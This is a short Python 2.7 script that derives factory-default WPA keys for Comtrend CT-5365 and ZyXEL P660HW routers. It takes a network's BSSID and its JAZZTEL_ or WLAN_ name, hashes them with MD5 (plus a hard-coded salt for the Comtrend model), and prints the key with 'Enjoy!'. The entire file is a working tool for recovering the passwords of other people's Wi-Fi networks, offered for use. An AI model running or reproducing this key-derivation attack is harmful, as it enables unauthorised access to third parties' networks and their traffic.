#!/usr/bin/env python2.7
__VERSION__ = "0.1"

import sys
if not sys.version_info[0:2] == (2,7):
    print >> sys.stderr, "Python 2.7 or higher required. Exiting."
    sys.exit(-2)

import re
import sys
import argparse
import hashlib

_COMTREND_SALT = "bcgbghgg"

def mac_validator(raw):
    mac = raw.replace(":", "")
    if not re.match(r"[\dA-F]{12}$", mac, re.IGNORECASE):
        raise argparse.ArgumentTypeError("%s is not a valid MAC address" % raw)
    return mac.upper()

def known_essid_validator(raw):
    match = re.match("(JAZZTEL|WLAN)_([\dA-F]{4})$", raw, re.IGNORECASE)
    if not match:
        raise argparse.ArgumentTypeError("%s is not a known network name (e.g. WLAN_DEAD)" % raw)
    return match.group(2).upper()

def parse_args():
    parser = argparse.ArgumentParser(
            description='Spits out default WPA keys (Comtrend CT-5365, ZyXEL P660HW)')
    parser.add_argument('--version', action='version', version='Py_XXXX %s' % __VERSION__)
    parser.add_argument('-b', '--bssid', type=mac_validator, required=True,
                        help="Router's BSSID (e.g. 00:1f:BE:BE:CA:FE)")
    parser.add_argument('-e', '--essid', type=known_essid_validator, required=True,
                        help="Router's ESSID (e.g. WLAN_DEAD)")
    models = parser.add_mutually_exclusive_group(required=True)
    models.add_argument('-c', '--comtrend', action='store_const', const="comtrend__ct-5365", 
                        dest="model", help="Selects router Comtrend CT-5365") 
    models.add_argument('-z', '--zyxel', action='store_const', const="zyxel__p660hw",
                        dest="model", help="Selects router ZyXEL P660HW") 

    args = parser.parse_args()
    return (args.essid, args.bssid, args.model)

def calculate_comtrend(essid, bssid):
    md5_calc = hashlib.md5()
    md5_calc.update(_COMTREND_SALT)
    md5_calc.update(bssid[0:8] + essid)
    md5_calc.update(bssid)
    return md5_calc.hexdigest()[0:20]

def calculate_zyxel(essid, bssid):
    md5_calc = hashlib.md5()
    md5_calc.update(bssid.lower()[0:8])
    md5_calc.update(essid.lower())
    return md5_calc.hexdigest()[0:20]

_CALL_MAPPINGS = {'comtrend__ct-5365': calculate_comtrend, 
                  'zyxel__p660hw': calculate_zyxel}

def main():
    (essid, bssid, model) = parse_args()
    print "WPA key found: %s\nEnjoy!" % _CALL_MAPPINGS[model](essid, bssid)
    return 0

if __name__ == '__main__':
    sys.exit(main())
